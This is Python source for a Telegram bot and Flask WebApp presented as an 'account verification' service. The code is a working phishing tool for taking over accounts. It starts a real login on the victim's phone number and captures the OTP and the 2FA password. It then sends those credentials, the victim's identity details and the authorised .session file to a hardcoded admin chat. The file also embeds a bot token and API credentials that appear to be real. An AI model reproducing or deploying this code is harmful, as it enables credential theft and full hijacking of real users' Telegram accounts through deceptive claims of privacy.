import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import logging
import random
from datetime import datetime

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# Storage
user_data = {}
pending_verifications = {}

# ==================== SIMPLE TELEGRAM FUNCTIONS ====================
def run_async(coro):
    """Run async function in thread-safe way"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(coro)
        return result
    except Exception as e:
        logger.error(f"Async error: {e}")
        return None
    finally:
        loop.close()

async def send_telegram_otp(phone):
    """Send OTP using Telethon"""
    try:
        # Create session directory
        os.makedirs('sessions', exist_ok=True)
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        
        logger.info(f"📤 Sending Telegram OTP to {phone}")
        
        # Create client
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        
        # Send OTP request
        result = await client.send_code_request(phone)
        
        logger.info(f"✅ Telegram OTP sent to {phone}")
        
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash,
            'session_name': session_name,
            'client': client  # Keep client for verification
        }
        
    except FloodWaitError as e:
        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        logger.error(f"Telegram OTP error: {e}")
        return {'success': False, 'error': str(e)}

async def verify_telegram_otp(phone, otp_code, phone_code_hash, session_name):
    """Verify OTP using Telethon"""
    try:
        logger.info(f"🔐 Verifying Telegram OTP for {phone}")
        
        # Create client
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        
        # Verify OTP
        try:
            await client.sign_in(
                phone=phone,
                code=otp_code,
                phone_code_hash=phone_code_hash
            )
        except SessionPasswordNeededError:
            # 2FA required
            return {'success': True, 'requires_2fa': True, 'session_name': session_name}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid OTP code'}
        
        # Check if authorized
        if await client.is_user_authorized():
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            await client.session.save()
            session_file = f"{client.session.filename}.session"
            
            logger.info(f"✅ Telegram user verified: @{user_info.get('username', 'N/A')}")
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            return {'success': False, 'error': 'Not authorized'}
            
    except Exception as e:
        logger.error(f"Telegram OTP verification error: {e}")
        return {'success': False, 'error': str(e)}

async def verify_telegram_2fa(session_name, password):
    """Verify 2FA password"""
    try:
        logger.info(f"🔐 Verifying Telegram 2FA")
        
        # Create client
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        
        # Verify 2FA
        await client.sign_in(password=password)
        
        # Get user info
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save session
        await client.session.save()
        session_file = f"{client.session.filename}.session"
        
        logger.info(f"✅ Telegram 2FA successful for @{user_info.get('username', 'N/A')}")
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
        
    except Exception as e:
        logger.error(f"Telegram 2FA error: {e}")
        return {'success': False, 'error': str(e)}

# ==================== HELPER FUNCTIONS ====================
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>TELEGRAM ACCOUNT VERIFIED</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if name:
                message += f"\n👤 Name: {name}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info.get('username')}"
            if user_info.get('id'):
                message += f"\n🆔 ID: {user_info.get('id')}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if exists
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Telegram session file for {phone}"
                    )
                    logger.info(f"📁 Sent session file to admin: {session_file}")
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about Telegram account: {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

def clean_phone(phone):
    """Clean phone number"""
    if not phone:
        return None
    
    # Remove all non-digit characters except +
    cleaned = ''.join(c for c in phone if c.isdigit() or c == '+')
    
    # Ensure it starts with +
    if not cleaned.startswith('+'):
        if cleaned.startswith('0'):
            cleaned = '+91' + cleaned[1:]
        elif len(cleaned) == 10:
            cleaned = '+91' + cleaned
        else:
            cleaned = '+' + cleaned
    
    return cleaned

def clean_otp(otp):
    """Clean OTP - Telegram sends 5 digits"""
    if not otp:
        return None
    
    # Remove all non-digits
    cleaned = ''.join(filter(str.isdigit, otp))
    
    # Telegram OTP is 5 digits
    if len(cleaned) == 5:
        return cleaned
    elif len(cleaned) == 6:
        # If user entered 6 digits, take first 5
        return cleaned[:5]
    
    return None

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBAPP_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://itz-me-545-telegram.onrender.com"
        else:
            port = os.environ.get('PORT', 5000)
            WEBAPP_URL = f"http://localhost:{port}"
        
        logger.info(f"🌐 WebApp URL: {WEBAPP_URL}")
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(WEBAPP_URL)
        )
        kb.add(btn)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Telegram Account Verification</b>

Click the button below to verify your Telegram account:

✅ <b>How it works:</b>
1️⃣ Open WebApp
2️⃣ Share your contact
3️⃣ We send real OTP via Telegram
4️⃣ Enter OTP in WebApp
5️⃣ Get your Telegram session file

<b>⚠️ Important:</b>
• We use Telegram's official OTP system
• Your contact is auto-deleted for privacy
• Get .session file for account access

<b>Click below to begin:</b>"""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"✅ Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing - SEND REAL TELEGRAM OTP"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Clean phone
        phone = clean_phone(phone)
        if not phone:
            bot.send_message(message.chat.id, "❌ Invalid phone number format.")
            return
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'username': message.from_user.username,
            'lang': message.from_user.language_code,
            'contact_time': time.time()
        }
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}

⏳ <b>Sending real Telegram OTP...</b>

We're contacting Telegram to send you a 5-digit verification code.""",
            parse_mode='HTML'
        )
        
        # Send Telegram OTP in background
        def send_otp_task():
            try:
                logger.info(f"📤 Sending Telegram OTP to {phone}")
                result = run_async(send_telegram_otp(phone))
                
                if result and result.get('success'):
                    # Store verification data
                    pending_verifications[phone] = {
                        'phone_code_hash': result['phone_code_hash'],
                        'session_name': result['session_name'],
                        'user_id': user_id,
                        'sent_time': time.time()
                    }
                    
                    # Success message
                    success_msg = f"""✅ <b>TELEGRAM OTP SENT!</b>

📱 Phone: {phone}
🔢 <b>5-digit Telegram OTP</b> has been sent

Check your Telegram app for the verification code.

<b>⚠️ IMPORTANT:</b>
• Check your Telegram app for the <b>5-digit code</b>
• Telegram sends codes like: 12345
• Enter code in WebApp
• Code expires in 5 minutes

Return to WebApp and enter the code.""",
                    
                    bot.edit_message_text(
                        success_msg,
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin
                    send_to_admin(phone, user_info=user_data[user_id])
                    
                    logger.info(f"✅ Telegram OTP sent to {phone}")
                else:
                    error_msg = result.get('error', 'Failed to send OTP') if result else 'Unknown error'
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {error_msg}",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
                bot.edit_message_text(
                    "❌ <b>Server Error:</b> Failed to send OTP",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data for WebApp"""
    data = user_data.get(user_id, {})
    
    response = {
        'success': 'phone' in data,
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'username': data.get('username', ''),
        'lang': data.get('lang', ''),
        'has_pending': data.get('phone', '') in pending_verifications
    }
    
    return jsonify(response)

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify Telegram OTP"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 Telegram OTP verification for user {user_id}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({
                'success': False, 
                'error': 'Invalid OTP. Telegram sends 5-digit codes (e.g., 12345)'
            })
        
        # Get user phone
        user_info = user_data.get(int(user_id), {})
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Get pending verification
        pending = pending_verifications.get(phone)
        if not pending:
            return jsonify({'success': False, 'error': 'No OTP sent. Please share contact again.'})
        
        # Check if expired (5 minutes)
        if time.time() - pending.get('sent_time', 0) > 300:
            del pending_verifications[phone]
            return jsonify({'success': False, 'error': 'OTP expired. Please restart.'})
        
        # Verify Telegram OTP
        result = run_async(verify_telegram_otp(
            phone, 
            cleaned_otp, 
            pending['phone_code_hash'], 
            pending['session_name']
        ))
        
        if not result:
            return jsonify({'success': False, 'error': 'Verification failed'})
        
        if result.get('success'):
            if result.get('requires_2fa'):
                # 2FA required
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'session_name': pending['session_name'],
                    'message': '2FA password required'
                })
            else:
                # Success - Telegram account verified
                # Send to admin
                send_to_admin(
                    phone, 
                    otp=cleaned_otp,
                    user_info=result.get('user_info'),
                    session_file=result.get('session_file')
                )
                
                # Clean up
                if phone in pending_verifications:
                    del pending_verifications[phone]
                
                logger.info(f"✅ Telegram account verified: {phone}")
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Telegram account verified successfully!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"Telegram OTP verification error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify Telegram 2FA"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        session_name = data.get('session_name', '')
        
        logger.info(f"🔐 Telegram 2FA for user {user_id}")
        
        if not user_id or not password or not session_name:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Verify 2FA
        result = run_async(verify_telegram_2fa(session_name, password))
        
        if not result:
            return jsonify({'success': False, 'error': '2FA verification failed'})
        
        if result.get('success'):
            # Get user phone
            user_info = user_data.get(int(user_id), {})
            phone = user_info.get('phone', '')
            
            # Send to admin with password
            send_to_admin(
                phone,
                password=password,
                user_info=result.get('user_info'),
                session_file=result.get('session_file')
            )
            
            logger.info(f"✅ Telegram 2FA successful for {phone}")
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Wrong password')
            })
            
    except Exception as e:
        logger.error(f"Telegram 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """Handle contact sharing from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        phone = data.get('phone', '').strip()
        
        logger.info(f"📱 WebApp contact: {phone}")
        
        if not user_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Clean phone
        phone = clean_phone(phone)
        if not phone:
            return jsonify({'success': False, 'error': 'Invalid phone number'})
        
        # Store user data
        user_data[int(user_id)] = {
            'phone': phone,
            'contact_time': time.time()
        }
        
        return jsonify({
            'success': True,
            'message': 'Contact received'
        })
        
    except Exception as e:
        logger.error(f"API contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== CLEANUP ====================
def cleanup():
    """Cleanup old data"""
    while True:
        try:
            time.sleep(60)
            current_time = time.time()
            
            # Clean old pending verifications
            expired = []
            for phone, data in list(pending_verifications.items()):
                if current_time - data.get('sent_time', 0) > 300:  # 5 minutes
                    expired.append(phone)
            
            for phone in expired:
                del pending_verifications[phone]
            
            # Clean old user data
            expired_users = []
            for user_id, data in list(user_data.items()):
                if current_time - data.get('contact_time', 0) > 3600:  # 1 hour
                    expired_users.append(user_id)
            
            for user_id in expired_users:
                del user_data[user_id]
            
            if expired or expired_users:
                logger.info(f"🧹 Cleaned {len(expired)} verifications, {len(expired_users)} users")
                
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 TELEGRAM ACCOUNT VERIFICATION BOT")
    logger.info("="*60)
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"🔑 Telegram API ID: {API_ID}")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info("="*60)
    
    # Start cleanup
    cleanup_thread = threading.Thread(target=cleanup, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Setup webhook
    try:
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/webhook" if RENDER_EXTERNAL_HOSTNAME else None
        else:
            port = os.environ.get('PORT', 10000)
            WEBHOOK_URL = f"http://localhost:{port}/webhook"
        
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=WEBHOOK_URL)
            logger.info(f"✅ Webhook set: {WEBHOOK_URL}")
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        # Fallback to polling
        def run_polling():
            bot.polling(none_stop=True, interval=3, skip_pending=True)
        
        polling_thread = threading.Thread(target=run_polling, daemon=True)
        polling_thread.start()
        logger.info("✅ Started bot polling")
    
    # Start Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 Starting Flask on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
            )
